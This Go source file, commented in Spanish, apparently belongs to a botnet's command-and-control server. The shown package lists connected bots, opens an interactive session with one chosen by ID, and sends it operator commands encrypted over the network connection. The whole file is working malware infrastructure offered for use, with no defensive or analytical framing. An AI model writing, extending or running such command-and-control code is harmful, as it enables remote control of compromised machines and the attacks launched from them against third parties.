// Package nets proporciona funciones para interactuar con bots.
package nets

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"strings"

	seguridad "BOLUDO.NET/Seguridad"
	"BOLUDO.NET/config"
	"BOLUDO.NET/util"
)

// ReplBOT establece una sesión interactiva con un bot seleccionado por ID.
// Muestra un prompt para ingresar el ID del bot. El ID 9999 se usa para salir.
func ReplBOT() {
	var (
		ID      int
		Input   string
		replBOT bool
	)

	util.LimpiarConsola()
	Listar()

	fmt.Print("\nIngrese el ID del BOT (9999 para salir): ")
	fmt.Scan(&ID)
	fmt.Scanln()

	if ID == 9999 {
		return // Salir de la función si el ID es 9999
	}

	if !CheckBOT(ID) {
		fmt.Println("ID de BOT no válido.")
		return
	}

	util.LimpiarConsola()
	fmt.Printf("Sesión establecida: %s\n", config.BOT[ID].RemoteAddr())
	lector := bufio.NewReader(os.Stdin)

	for !replBOT {
		fmt.Printf("(%s)> ", config.BOT[ID].RemoteAddr())
		Input, _ = lector.ReadString('\n')
		Input = strings.TrimSpace(Input)

		if Input == "exit" {
			replBOT = true
			util.LimpiarConsola()
		} else {
			if !Enviar(ID, Input) {
				replBOT = true
			}
		}
	}
}

// Enviar envía un mensaje encriptado al bot con el ID especificado.
// Si hay un error al encriptar o enviar el mensaje, se registra un error.
func Enviar(ID int, InputSend string) bool {
	// Encriptar el mensaje
	InputEncrypt, err := seguridad.Encryptar(InputSend)
	if err != nil {
		log.Fatalf("[!] ERROR AL ENCRIPTAR: %s", err.Error())
		return false
	}

	if CheckBOT(ID) {
		BOT := config.BOT[ID]
		_, err := BOT.Write([]byte(InputEncrypt))
		if err != nil {
			if err == net.ErrClosed {
				log.Printf("[!] El cliente se desconectó: %s", err.Error())
				return false
			}
			log.Printf("[!] ERROR AL ENVIAR (Sección Write): %s", err.Error())
			return false
		}
		return true
	}

	log.Printf("[!] BOT con ID %d no válido o desconectado.", ID)
	return false
}
